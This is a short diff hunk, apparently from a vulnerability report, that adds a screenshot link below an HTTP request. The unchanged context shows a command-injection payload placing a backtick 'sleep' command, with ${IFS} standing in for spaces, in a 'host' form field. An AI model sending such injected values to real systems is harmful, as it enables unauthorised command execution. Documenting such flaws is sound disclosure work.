@@ -33,5 +33,7 @@ Connection: close
 
 host=`sleep${IFS}3`&mode=0&port=80&user=&password=
 ```
+<img width="1014" alt="图片" src="https://github.com/user-attachments/assets/a22ce3c3-0797-4841-9c19-9353901e229b">
+
 <img width="1019" alt="图片" src="https://github.com/user-attachments/assets/ec3ecb0e-d3a0-4814-a270-9d9eb196dc61">
 
